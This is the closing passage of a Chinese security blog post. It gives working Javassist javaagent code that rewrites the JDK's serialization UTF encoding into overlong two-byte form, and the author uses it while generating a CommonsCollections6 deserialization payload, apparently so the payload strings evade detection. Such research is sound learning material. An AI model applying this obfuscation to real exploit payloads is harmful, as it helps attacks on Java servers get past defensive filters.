</span></span></span></code></pre></div><p>然后运行<code>agent_test</code>进行<code>attach</code>，成功执行<code>agentmain()</code>中的代码</p>
<p><img loading="lazy" src="../images/image-20241217174941765.png" alt="image-20241217174941765"  />
</p>
<h3 id="实战">实战<a hidden class="anchor" aria-hidden="true" href="#实战">#</a></h3>
<p>我们学完agent怎么修改class后解决这个问题轻而易举！</p>
<p>我这里是用premain，然后通过javaagent来加载我们生成的jar包，这里直接上我最后的poc吧</p>
<p><code>JieTransformer</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.jie</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.instrument.ClassFileTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.instrument.IllegalClassFormatException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.security.ProtectionDomain</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JieTransformer</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ClassFileTransformer</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">loader</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">classBeingRedefined</span><span class="p">,</span><span class="w"> </span><span class="n">ProtectionDomain</span><span class="w"> </span><span class="n">protectionDomain</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">classfileBuffer</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalClassFormatException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//拦截即将被加载或重加载的class</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">className</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&#34;java/io/ObjectOutputStream$BlockDataOutputStream&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;111111111111111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">cp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">cp</span><span class="p">.</span><span class="na">importPackage</span><span class="p">(</span><span class="n">IOException</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                if (classBeingRedefined != null) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    ClassClassPath ccp = new ClassClassPath(classBeingRedefined);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                    cp.insertClassPath(ccp);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtClass</span><span class="w"> </span><span class="n">ctc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cp</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;java.io.ObjectOutputStream$BlockDataOutputStream&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtMethod</span><span class="w"> </span><span class="n">method1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctc</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;getUTFLength&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">CtClass</span><span class="o">[]</span><span class="p">{</span><span class="n">cp</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;java.lang.String&#34;</span><span class="p">)});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">removeMethod</span><span class="p">(</span><span class="n">method1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtMethod</span><span class="w"> </span><span class="n">make1</span><span class="o">=</span><span class="n">CtNewMethod</span><span class="p">.</span><span class="na">make</span><span class="p">(</span><span class="s">&#34;long getUTFLength(String s) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            int len = s.length();\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            long utflen = 0;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            for (int off = 0; off &lt; len; ) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                int csize = Math.min(len - off, CHAR_BUF_SIZE);\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                s.getChars(off, off + csize, cbuf, 0);\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                for (int cpos = 0; cpos &lt; csize; cpos++) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    char c = cbuf[cpos];\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                    if (c &gt;= 0x0001 &amp;&amp; c &lt;= 0x0020) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        utflen++;\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                    } else if (c &gt; 0x07FF) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        utflen += 3;\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                    } else {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                        utflen += 2;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                    }\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                off += csize;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            return utflen;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;        }&#34;</span><span class="p">,</span><span class="n">ctc</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtMethod</span><span class="w"> </span><span class="n">method2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctc</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;writeUTFBody&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">CtClass</span><span class="o">[]</span><span class="p">{</span><span class="n">cp</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;java.lang.String&#34;</span><span class="p">)});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">removeMethod</span><span class="p">(</span><span class="n">method2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">CtMethod</span><span class="w"> </span><span class="n">make2</span><span class="o">=</span><span class="n">CtMethod</span><span class="p">.</span><span class="na">make</span><span class="p">(</span><span class="s">&#34;private void writeUTFBody(String s) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            int limit = MAX_BLOCK_SIZE - 3;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            int len = s.length();\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            for (int off = 0; off &lt; len; ) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                int csize = Math.min(len - off, CHAR_BUF_SIZE);\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                s.getChars(off, off + csize, cbuf, 0);\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                for (int cpos = 0; cpos &lt; csize; cpos++) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    char c = cbuf[cpos];\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    if (pos &lt;= limit) {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        if (c &lt;= 0x0020 &amp;&amp; c != 0) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            buf[pos++] = (byte) c;\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        } else if (c &gt; 0x07FF) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            buf[pos + 2] = (byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            buf[pos + 1] = (byte) (0x80 | ((c &gt;&gt; 6) &amp; 0x3F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            buf[pos + 0] = (byte) (0xE0 | ((c &gt;&gt; 12) &amp; 0x0F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            pos += 3;\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        } else {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            buf[pos + 1] = (byte) (0x80 | ((c &gt;&gt; 0) &amp; 0x3F));\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            buf[pos + 0] = (byte) (0xC0 | ((c &gt;&gt; 6) &amp; 0x1F));\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            pos += 2;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        }\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    } else {    // write one byte at a time to normalize block\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        if (c &lt;= 0x0020 &amp;&amp; c != 0) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            write(c);\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        } else if (c &gt; 0x07FF) {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            write(0xE0 | ((c &gt;&gt; 12) &amp; 0x0F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            write(0x80 | ((c &gt;&gt; 6) &amp; 0x3F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                            write(0x80 | ((c &gt;&gt; 0) &amp; 0x3F));\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        } else {\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            write(0xC0 | ((c &gt;&gt; 6) &amp; 0x1F));\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                            write(0x80 | ((c &gt;&gt; 0) &amp; 0x3F));\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//                        &#34;                        }\n&#34; +</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                    }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;                off += csize;\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;            }\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="s">&#34;        }&#34;</span><span class="p">,</span><span class="n">ctc</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">addMethod</span><span class="p">(</span><span class="n">make1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">addMethod</span><span class="p">(</span><span class="n">make2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctc</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ctc</span><span class="p">.</span><span class="na">detach</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;maked&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Demo</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.jie</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.n1ght.NightTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.instrument.Instrumentation</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.AccessibleObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Demo</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">premain</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">Instrumentation</span><span class="w"> </span><span class="n">inst</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inst</span><span class="p">.</span><span class="na">addTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">JieTransformer</span><span class="p">(),</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//生成transform()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">inst</span><span class="p">.</span><span class="na">retransformClasses</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//这里只是用来触发生成transform()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 重加载某个 class, 注意在重加载 class 的过程中, 之前设置的 transformer 会拦截该 class</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>MANIFEST.MF</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Manifest</span><span class="o">-</span><span class="n">Version</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="p">.</span><span class="na">0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Can</span><span class="o">-</span><span class="n">Redefine</span><span class="o">-</span><span class="n">Classes</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Can</span><span class="o">-</span><span class="n">Retransform</span><span class="o">-</span><span class="n">Classes</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Premain</span><span class="o">-</span><span class="n">Class</span><span class="p">:</span><span class="w"> </span><span class="n">com</span><span class="p">.</span><span class="na">jie</span><span class="p">.</span><span class="na">Demo</span><span class="w">
</span></span></span></code></pre></div><p>然后将这个模块生成jar包，在CC6执行添加这个-javaagent:jarpath</p>
<p>看看效果图吧，属性的问题都解决了</p>
<p><img loading="lazy" src="../images/image-20241218194848257.png" alt="image-20241218194848257"  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/">
    <span class="title">« 上一页</span>
    <br>
    <span>pickle&amp;types.CodeType实现接管任意函数</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/commonsbeanutilsshiro550/">
    <span class="title">下一页 »</span>
    <br>
    <span>CommonsBeanutils&amp;shiro550</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
